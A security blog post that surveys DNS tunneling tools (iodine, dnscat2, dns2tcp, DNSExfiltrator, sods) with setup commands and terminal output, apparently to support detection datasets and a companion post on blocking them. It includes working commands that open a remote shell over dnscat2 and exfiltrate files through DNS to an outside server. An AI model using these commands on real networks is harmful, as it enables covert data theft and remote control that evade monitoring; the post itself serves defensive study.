---
title: "Overview of mainstream DNS tunneling tools"
summary: "This post is an overview of some dns tunnneling tools with installation procedure."
date: 2023-07-04T00:00:00+01:00
draft: false
tags: ['dns', 'security']
pin: true
---

# Overview of mainstream DNS tunneling tools

This post provides a overview of various DNS tunneling tools with complete with installation procedures.

## What is DNS tunneling?

DNS tunneling exploits DNS protocol for tunneling data via DNS query and response packet.

It can be used to extract or import data silently from a corporate network.

> Great post about DNS tunneling to read:
> - [DNS Tunneling: how DNS can be (ab)used by malicious actors](https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/) or [PDF](./../../pdf/0047/unit42_paloaltonetworks_com_dns_tunneling_how_dns_can_be_abused_by_malicious_actors.pdf)

## Tools overview

Before to start, take a look to the post [DNS tunneling protection with DNSdist](https://dmachard.github.io/posts/0048-dnsdist-dns-tunneling-protection/) to block these tools.
### Iodine

Tunnel IPv4 data over DNS
- Github URL: https://github.com/yarrick/iodine
- Qtype DNS used: NULL, PRIVATE, MX, CNAME and TXT
- Network capture: https://github.com/dmachard/datasets-malicious-dns/blob/main/iodine.pcap

Run server side

```bash
sudo docker run --cap-add=NET_ADMIN --device=/dev/net/tun --network=host -it dmachard/iodine:latest server -f 10.0.0.1 tun.example.com
Enter tunnel password: 
Opened dns0
Setting IP of dns0 to 10.0.0.1
Setting MTU of dns0 to 1130
Opened IPv4 UDP socket
Opened IPv6 UDP socket
Listening to dns for domain tun.example.com
```

Run client

```bash
sudo docker run --cap-add=NET_ADMIN --device=/dev/net/tun --network=host -it dmachard/iodine:latest client -f -r 8.8.8.8 tun.example.com
Enter tunnel password: 
Opened dns0
Opened IPv4 UDP socket
Sending DNS queries for tun.example.com to 8.8.8.8
Autodetecting DNS query type (use -T to override).
Using DNS type NULL queries
Version ok, both using protocol v 0x00000502. You are user #0
Setting IP of dns0 to 10.0.0.2
Setting MTU of dns0 to 1130
Server tunnel IP is 10.0.0.1
Skipping raw mode
Using EDNS0 extension
Switching upstream to codec Base128
Server switched upstream to codec Base128
No alternative downstream codec available, using default (Raw)
Switching to lazy mode for low-latency
Server switched to lazy mode
Autoprobing max downstream fragment size... (skip with -m fragsize)
768 ok.. 1152 ok.. 1344 ok.. 1440 ok.. 1488 ok.. 1512 ok.. 1524 ok.. will use 1524-2=1522
Setting downstream fragment size to max 1522...
Connection setup complete, transmitting data.
```

Upload a local file to remote side

```bash
$ sudo scp /tmp/wireshark_wlp2s0IJSF71.pcapng root@10.0.0.1:/tmp
The authenticity of host '10.0.0.1 (10.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:n1Tj0bCqHpZswnjP92E33SoCQL4nj3pRKwS1qHB2RqY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.0.1' (ED25519) to the list of known hosts.
root@10.0.0.1's password: 
wireshark_wlp2s0IJSF71.pcapng                   36% 3504KB 304.9KB/s   00:19 ETA
```

### DNSCat2

Resume:
- Github URL: https://github.com/iagox86/dnscat2
- Qtype DNS used: TXT, CNAME, MX
- Network capture: https://github.com/dmachard/datasets-malicious-dns/blob/main/dnscat2.pcap

Run server side

```bash
# sudo docker run -p 53:53/udp -it --rm dmachard/dnscat2:latest server biillpi.com

New window created: 0
New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = biillpi.com]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=e9829a2263f0c5ca10c8024dd551691f biillpi.com

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=e9829a2263f0c5ca10c8024dd551691f

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.

dnscat2> 
```

Run client

```bash
$ sudo docker run -it --rm dmachard/dnscat2:latest client --secret=e9829a2263f0c5ca10c8024dd551691f biillpi.com
Creating DNS driver:
 domain = biillpi.com
 host   = 0.0.0.0
 port   = 53
 type   = TXT,CNAME,MX
 server = 192.168.1.210

** Peer verified with pre-shared secret!

Session established!
```

Open a remote shell from server

```bash
dnscat2> session -i 2

command (1535f3a093f8) 2> shell
Sent request to execute a shell
command (1535f3a093f8) 2> New window created: 3
Shell session created!

command (1535f3a093f8) 2> session -i 3
New window created: 3
history_size (session) => 1000
Session 3 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

sh (1535f3a093f8) 3> ls -alrt
```


### dns2tcp

Resume:
- Github URL: https://github.com/alex-sector/dns2tcp
- Qtype DNS used: TXT, KEY 
- Network capture: https://github.com/dmachard/datasets-malicious-dns/blob/main/dns2tcp.pcap

Compilation

```bash
./configure
make
mkdir /var/empty/dns2tcp/
```

Start server

```bash
cd server

cat > ~/dns2tcpdrc << EOF	
listen = 0.0.0.0
port = 5353
user = nobody
key = whateveryouwant
chroot = /var/empty/dns2tcp/
domain = dns2tcp.hsc.fr
resources = ssh:127.0.0.1:22
EOF

./dns2tcpd -d 1 -f dns2tcpdrc -F 
22:26:22 : Debug options.c:97	Add resource ssh:127.0.0.1 port 22
22:26:22 : Debug socket.c:55	Listening on 0.0.0.0:5353 for domain dns2tcp.hsc.fr
Starting Server v0.5.2...
22:26:22 : Debug main.c:132	Chroot to /var/empty/dns2tcp/
20:26:22 : Debug main.c:142	Change to user nobody
```

Start client

```bash
cd client

cat > ~/.dns2tcprc << EOF
domain = dns2tcp.hsc.fr
resource = ssh
local_port = 4430
debug_level = 1
key = whateveryouwant
server = 192.168.1.210
EOF

./dns2tcpc -f dns2tcprc
debug level 1
Listening on port : 4430
22:52:25 : Debug session.c:54	Session created (0xa4cf)
22:52:25 : Debug auth.c:94	Connect to resource "ssh"
22:52:25 : Debug client.c:141	Adding client auth OK: 0xa4cf
22:52:54 : Debug requests.c:274	send desauth
22:52:54 : Debug client.c:69	free client 
```

Exfiltrate a file to remote

```bash
scp -P 4430 /myfile.txt root@127.0.0.1:/tmp
```

### DNSExfiltrator

Resume:
- Github URL: https://github.com/Arno0x/DNSExfiltrator
- Qtype DNS used: TXT
- Network capture: https://github.com/dmachard/datasets-malicious-dns/blob/main/dns2tcp.pcap

Start the server

```bash
# python2 dnsexfiltrator.py  -d hsc.fr -p password
[*] DNS server listening on port 53
[+] Decrypting using password [password] and saving to output file [Installer.exe.zip]
[+] Output file [Installer.exe.zip] saved successfully
```

Run client to exfiltrate a file

```bash
C:\Users\>dnsExfiltrator.exe Installer.exe hsc.fr password -b32 s=192.168.1.210
[*] Working with DNS server [192.168.1.210]
[*] Compressing (ZIP) the [Installer.exe] file in memory
[*] Encrypting the ZIP file with password [password]
[*] Encoding the data with Base32
[*] Total size of data to be transmitted: [2757608] bytes
[+] Maximum data exfiltrated per DNS request (chunk max size): [233] bytes
[+] Number of chunks: [11836]
[*] Sending 'init' request
[*] Sending data...
[*] DONE !
```

### Sods

Resume:
- Github URL: https://github.com/msantos/sods
- Qtype DNS used: TXT, CNAME and NULL
- Network capture: https://github.com/dmachard/datasets-malicious-dns/blob/main/sods.pcap

```bash
sudo groupadd nogroup
mkdir -p /var/chroot/sods

server


 ./sods -vvvv -L 127.0.0.1:22 -p 5353 hsc.fr
Forwarded sessions = 1
Forward #0: 127.0.0.1:22

client

sudo ./sdt -v -p 22 -r 192.168.1.210 tun.hsc.fr
listening on port = 22
session id = 22508, opt = 0, session = 0
```

Make ssh from client to the remote server like this

```bash
ssh root@localhost
```

### Other tools

- https://github.com/mdornseif/DeNiSe
- https://code.google.com/archive/p/dnscapy/
- https://github.com/BishopFox/sliver